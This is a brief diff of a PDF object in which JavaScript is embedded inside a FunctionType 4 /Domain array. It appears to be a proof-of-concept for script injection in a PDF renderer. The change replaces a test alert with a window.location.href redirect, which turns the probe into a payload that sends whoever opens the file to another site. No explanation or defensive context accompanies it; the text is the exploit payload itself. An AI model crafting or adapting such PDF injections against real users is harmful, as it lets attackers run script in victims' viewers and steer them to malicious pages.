@@ -3,7 +3,7 @@
 <<
   /FunctionType 4
   /Domain [(console.log("Starting"),
-alert("Proof Of Concept")
+ window.location.href = "https://www.google.com";
 ) 0]
   /Range [0 0]
   /Length 12
